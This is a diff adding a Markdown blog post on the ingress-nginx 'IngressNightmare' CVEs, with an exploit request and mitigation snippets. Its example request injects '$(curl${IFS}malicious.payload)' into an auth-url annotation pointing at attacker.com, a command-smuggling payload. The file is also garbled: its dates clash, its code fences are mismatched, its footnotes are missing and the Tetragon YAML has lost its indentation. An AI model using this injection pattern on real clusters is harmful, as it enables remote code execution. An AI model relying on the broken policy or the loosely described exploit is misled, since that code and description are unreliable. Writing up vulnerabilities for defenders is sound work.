@@ -1,0 +1,80 @@
+---
+title: Blog First
+date: 2024-02-23 12:34:27 -500
+categories: [kubernetes security]
+tags: [vulnerability,redteam]
+---
+
+### Article 1: Enhanced Ingress-NGINX Controller Security Analysis
+
+```markdown
+---
+layout: post
+title: "Advanced Ingress-NGINX Security: Mitigating Critical Vulnerabilities"
+date: 2025-04-07
+categories: [Kubernetes, Security]
+---
+
+## The IngressNightmare Vulnerabilities (CVE-2025 Series)
+In March 2025, security researchers disclosed four critical vulnerabilities enabling full cluster compromise through the ingress-nginx admission controller[^2][^9]. These vulnerabilities exploit configuration injection flaws in:
+
+1. **auth-url annotation** (CVE-2025-24514)
+2. **auth-tls-match-cn annotation** (CVE-2025-1097)
+3. **mirror-target/mirror-host** (CVE-2025-1098)
+4. **Admission Controller RCE** (CVE-2025-1974 CVSS 9.8)
+
+### Technical Exploit Chain
+```
+
+POST /networking/v1/ingresses HTTP/1.1
+Host: admission-controller:8443
+Content-Type: application/json
+
+{
+"apiVersion": "networking.k8s.io/v1",
+"kind": "Ingress",
+"metadata": {
+"annotations": {
+"nginx.ingress.kubernetes.io/auth-url": "http://attacker.com/$(curl${IFS}malicious.payload)"
+}
+}
+}
+
+```
+This payload exploits CVE-2025-24514 to execute arbitrary commands during NGINX configuration validation[^9].
+
+## Enhanced Mitigation Strategies
+### 1. Admission Controller Hardening
+```
+
+
+# Restrict admission controller network exposure
+
+kubectl patch svc ingress-nginx-controller-admission -p '{"spec":{"type":"ClusterIP"}}'
+
+```
+### 2. Runtime Security
+```
+
+
+# eBPF-based detection with Tetragon
+
+apiVersion: cilium.io/v1alpha1
+kind: TracingPolicy
+spec:
+kprobes:
+
+- call: "execve"
+syscall: true
+args:
+    - index: 0
+type: "string"
+selectors:
+    - matchArgs:
+        - index: 0
+operator: "Prefix"
+values: ["/usr/local/nginx"]
+
+```
+This policy detects suspicious process executions in ingress-nginx pods[^8].
+```
